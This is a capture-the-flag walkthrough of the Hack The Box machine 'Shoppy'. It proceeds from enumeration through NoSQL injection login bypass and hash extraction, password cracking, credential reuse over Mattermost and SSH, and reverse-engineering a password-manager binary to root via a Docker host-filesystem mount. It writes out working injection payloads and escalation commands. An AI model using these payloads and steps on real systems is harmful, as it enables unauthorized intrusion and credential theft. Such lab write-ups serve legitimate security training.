# HTB Shoppy

## Enumeration

### Port Scanning

I started with an Nmap scan to identify the exposed services.

```
nmap -sC -sV -p22,80,9003 10.129.227.233
```

The scan revealed SSH on port 22 and an HTTP service on port 80 running nginx. The web server redirected requests to `shoppy.htb`, so I added the hostname to `/etc/hosts`.

```
echo "10.129.227.233 shoppy.htb" | sudo tee -a /etc/hosts
```

|Port|Service|Details|
|---|---|---|
|22|SSH|OpenSSH 8.4p1 Debian|
|80|HTTP|nginx 1.23.1|
|9003|—|Closed|

### Directory Enumeration

I used `ffuf` to discover accessible web paths.

```
ffuf -u http://shoppy.htb/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

The scan identified `/login`, `/admin`, and `/exports`, among other directories. The login page became the primary target for further testing.

### Virtual Host Enumeration

Next, I enumerated subdomains using the HTTP `Host` header.

```
ffuf -u http://shoppy.htb/ \
  -H "Host: FUZZ.shoppy.htb" \
  -w ./wordlist.txt \
  -fc 301
```

This revealed a virtual host named `mattermost`.

I added it to `/etc/hosts`:

```
echo "10.129.227.233 mattermost.shoppy.htb" | sudo tee -a /etc/hosts
```

Visiting `mattermost.shoppy.htb` revealed a Mattermost instance, which would become important later in the attack chain.

## Initial Access - NoSQL Injection

### Authentication Bypass

While testing the login functionality on `shoppy.htb`, I discovered that the application was vulnerable to NoSQL injection.

![Shoppy 0](/assets/images/shoppy_0.png)

The following credentials bypassed the login check:
```
username=admin' || '' === '
password=pass
```


### Extracting User Hashes

Inside the admin panel, I found a user-search feature. Testing its `username` parameter revealed another NoSQL injection vulnerability.

The following URL returned user records:

```
http://shoppy.htb/admin/search-users?username='; return '' == '
```

The response contained two user records and their password hashes:

```
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "<HASH_REDACTED>"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "<HASH_REDACTED>"
  }
]
```

The hashes were 32 hexadecimal characters long, suggesting MD5. I used `hash-identifier` to confirm that MD5 was a plausible candidate.

### Cracking Josh's Hash

I saved Josh's hash to `hash.txt` and used Hashcat with the RockYou wordlist.

```
hashcat hash.txt \
  --wordlist /usr/share/wordlists/rockyou.txt \
  -m 0
```

Hashcat recovered the password:

```
<HASH_REDACTED>:<REDACTED>
```

I now had a valid credential pair to test against the other discovered services.

## Lateral Movement - Mattermost

I tried Josh's recovered credentials on `mattermost.shoppy.htb`, and they worked.

After logging in, I explored the available channels and found a conversation in the `deploy` channel containing credentials for another user.

The message from Josh read:

![Shoppy 1](/assets/images/shoppy_1.png)

The conversation exposed credentials for the `jaeger` account. I tested them against SSH.

```
ssh jaeger@10.129.227.233
```

Using the password `<REDACTED>`, I successfully logged in as `jaeger`.

## Privilege Escalation - jaeger to deploy

### Enumerating Sudo Permissions

After gaining an SSH shell, I checked the commands available through `sudo`.

```
sudo -l
```

The output showed that `jaeger` could execute a specific program as the `deploy` user:

```
User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

I inspected the `/home/deploy` directory:

```
ls -la /home/deploy
```

The directory contained a password-manager binary and two particularly interesting files:

```
-rwxr--r-- 1 deploy deploy 18440 Jul 22 2022 password-manager
-rw------- 1 deploy deploy   739 Feb  1 2022 password-manager.cpp
-rw------- 1 deploy deploy    56 Jul 22 2022 creds.txt
```

The source file and `creds.txt` were readable only by `deploy`, but I could execute the password manager through the permitted `sudo` rule.

### Testing the Recovered Password

The program prompted for a master password. I initially tried Josh's recovered password, but it was rejected.

```
sudo -u deploy /home/deploy/password-manager
```

```
Welcome to Josh password manager!
Please enter your master password: <REDACTED>
Access denied! This incident will be reported !
```

Rather than guessing blindly, I decided to reverse-engineer the binary.

### Reverse Engineering with Ghidra

I opened the executable in Ghidra and examined its decompiled `main` function.

The relevant logic appended individual characters to a string:

![Shoppy 2](/assets/images/shoppy_2.png)

The resulting string was compared with the password supplied by the user. If the comparison succeeded, the program executed:

```
system("cat /home/deploy/creds.txt");
```


### Retrieving deploy Credentials

I ran the password manager again with the discovered password:

```
sudo -u deploy /home/deploy/password-manager
```

```
Welcome to Josh password manager!
Please enter your master password: <REDACTED_RECOVERED_MASTER_PASS>
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: <REDACTED>
```

This revealed the credentials for the `deploy` account.

I switched to the account using the recovered password:

```
su - deploy
```

## Root Privilege Escalation - Docker Group

### Checking Group Membership

As `deploy`, I checked my group memberships.

```
id
```

```
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

The `docker` group membership was the key to obtaining root access. On a typical Linux host, a user who can control the Docker daemon can create containers with access to host resources, including the host's root filesystem.

### Mounting the Host Filesystem

The machine had an Alpine Docker image available locally:

```
docker images
```

```
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    d7d3d98c851f   4 years ago   5.53MB
```

I launched a container and mounted the host's root filesystem at `/mnt` inside the container.

```
docker run -it --rm -v /:/mnt alpine
```

Inside the container, the host filesystem was accessible:

```
cd /mnt
ls
```

I then read the root flag:

```
cat /mnt/root/root.txt
```


**Root obtained.**

## Attack Chain Summary

1. **Enumeration:** Discovered SSH, HTTP, and the `mattermost` virtual host.
    
2. **NoSQL injection:** Bypassed the Shoppy login and accessed the admin panel.
    
3. **Hash extraction:** Retrieved user hashes through the vulnerable search functionality.
    
4. **Password cracking:** Cracked Josh's MD5 hash using RockYou.
    
5. **Credential reuse:** Logged into Mattermost and discovered `jaeger`'s credentials.
    
6. **Sudo abuse:** Executed the password manager as `deploy`.
    
7. **Reverse engineering:** Recovered the hardcoded master password `Sample` from the binary.
    
8. **Docker abuse:** Used `deploy`'s Docker group membership to mount the host filesystem and read the root flag.
